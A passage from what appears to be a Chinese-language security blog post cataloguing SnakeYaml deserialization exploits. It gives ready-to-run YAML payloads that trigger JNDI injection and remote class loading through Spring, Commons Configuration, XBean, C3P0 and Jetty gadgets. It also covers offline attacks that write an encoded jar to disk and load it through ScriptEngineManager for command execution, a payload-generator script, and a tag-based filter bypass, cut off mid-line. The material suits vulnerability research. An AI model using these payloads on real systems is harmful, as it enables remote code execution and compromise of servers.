PropertyPathFactoryBean</h3><p>该Gadget的构造思路大致为，在org.springframework.beans.factory.config.PropertyPathFactoryBean类中的setBeanFactory方法，该方法能够调用任意beanFactory的getBean方法，在org.springframework.jndi.support.SimpleJndiBeanFactory类中的getBean方法能够利用lookup来触发JNDI注入。</p><p><img src="/2023/09/25/SnakeYaml/1709813159709-017fe583-9ed1-4737-a57e-d35584e0ec77.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813159848-ec87a1bf-efc7-46f9-afdb-12fc332806da.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertyPathFactoryBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://127.0.0.1:1389/5vezso\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: h3rmesk1t\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://127.0.0.1:1389/5vezso\&quot;]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813159967-c69aa779-f42d-4eda-97c0-5b811475362c.png"></p><h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>该调用链主要是触发的时候是利用key调用hashCode方法所产生的利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsConfigurationGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;set:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;ldap://127.0.0.1:1389/5vezso\&quot;]]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813160140-6a393f75-5929-4af7-99c6-b36d6d19f9bc.png"></p><h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>BadAttributeValueExpException类的构造函数会调用传入对象的toString方法，由于org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding不存在toString方法，因此会调用到其父类的toString方法，即javax.naming.Binding#toString方法，调用getObject方法。</p><p><img src="/2023/09/25/SnakeYaml/1709813160295-5e2d6f82-4c2c-49bf-a5db-c2dddbbc1f9d.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813160376-b73fa3d9-1e7a-4aca-b121-367e2fdee3a8.png"></p><p>org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding#getObject方法会调用org.apache.xbean.naming.context.ContextUtil#resolve方法，在这里会进行远程恶意类加载。</p><p><img src="/2023/09/25/SnakeYaml/1709813160465-149c6d41-7e11-45ae-aa4c-c352ad088a1c.png"></p><p><img src="/2023/09/25/SnakeYaml/1709813160562-cfefaeb7-7f98-4c05-b5a3-4630657c957a.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBeanGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  [\&quot;h3rmesk1t\&quot;, !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;Calculator\&quot;, \&quot;http://localhost:8080/\&quot;], !!org.apache.xbean.naming.context.WritableContext []\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813160657-4874abe9-c01f-4c8c-8859-b85ee4226420.png"></p><h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>参考C3P0的JNDI注入的Gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRefForwardingDataSourceGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; jndiName: \&quot;ldap://127.0.0.1:1389/5vezso\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; loginTimeout: -1&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813160819-ca33f074-57ef-4a13-a7d7-c8527dbdf125.png"></p><h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p>需要具有如下依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-jndi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-plus&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jetty-util&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">9.4</span><span class="number">.8</span>.v20171121&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Error ,Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;[!!org.eclipse.jetty.plus.jndi.Resource [\&quot;__/obj\&quot;, !!javax.naming.Reference [\&quot;foo\&quot;, \&quot;Exec\&quot;, \&quot;http://localhost:7777/\&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [\&quot;obj/test\&quot;, !!java.lang.Object []]]\n&quot;</span>;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    yaml.load(poc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h2><p>这里给出两种利用方式：</p><pre><code>- 利用C3P0中的HEX序列化类加载器反序列化链来实现- 利用Fastjson 1.2.68将jar包写入本地，然后ScriptEngineManger加载本地jar包进行代码执行</code></pre><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p>参考C3P0中十六进制序列化字节加载器Gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WrapperConnectionPoolDataSourceGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlData</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; userOverridesAsString: \&quot;HexAsciiSerializedMapquot;&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Yaml</span>().load(yamlData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/25/SnakeYaml/1709813160977-33f213b5-3e10-410a-b9ce-cc398797d41a.png"></p><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>Fastjson 1.2.68文件写入POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">    <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;file&quot;</span>: <span class="string">&quot;dst&quot;</span>,</span><br><span class="line">      <span class="string">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;infl&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;input&quot;</span>: <span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;bufLen&quot;</span>: <span class="number">1048576</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;protocolVersion&quot;</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造snakeyaml的POC如下，其中filepath是写入路径，base64是要写入文件的base64编码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [<span class="string">&quot;filePath&quot;</span>],<span class="literal">false</span>],!!java.util.zip.Inflater  &#123; input: !!binary base64 &#125;,<span class="number">1048576</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> snakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYaml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;./yaml-payload.jar\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary 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 &#125;,1048576]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入本地之后就可以通过ScriptEngineManager方式进行本地读取jar包，实现命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYaml</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;file:///yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里贴一个脚本来写入本地文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zlg.serialize.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlOffInternet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> createPoC(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;./file/yaml-payload.txt&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createPoC</span><span class="params">(String SrcPath,String Destpath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SrcPath);</span><br><span class="line">        <span class="type">Long</span> <span class="variable">FileLength</span> <span class="operator">=</span> file.length();</span><br><span class="line">        <span class="type">byte</span>[] FileContent = <span class="keyword">new</span> <span class="title class_">byte</span>[FileLength.intValue()];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            in.read(FileContent);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] compressbytes = compress(FileContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressbytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;&quot;</span>+Destpath+<span class="string">&quot;\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span>+base64str+<span class="string">&quot; &#125;,1048576]]&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="keyword">return</span> poc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] compress(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">        <span class="type">byte</span>[] output = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">Deflater</span> <span class="variable">compresser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Deflater</span>();</span><br><span class="line"></span><br><span class="line">        compresser.reset();</span><br><span class="line">        compresser.setInput(data);</span><br><span class="line">        compresser.finish();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(data.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (!compresser.finished()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> compresser.deflate(buf);</span><br><span class="line">                bos.write(buf, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            output = bos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            output = data;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        compresser.end();</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>在上文提到了，每个!!修饰过的类会被替换成对应的tag形式，并且使用了一个固定前缀tag:yaml.org,2002:，因此可以利用这个特性来bypass，参考<a href="https://b1ue.cn/archives/407.html">SnakeYaml 反序列化的一个小 trick</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!&lt;tag:yaml.org,<span class="number">2002</span>:javax.script.ScriptEngineManager&gt; </span><br><span class="line">[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URLClassLoader&gt; [[!&lt;tag:yaml.org,<span class="number">2002</span>:java.net.URL&gt; </span><br><span class="line">[<span 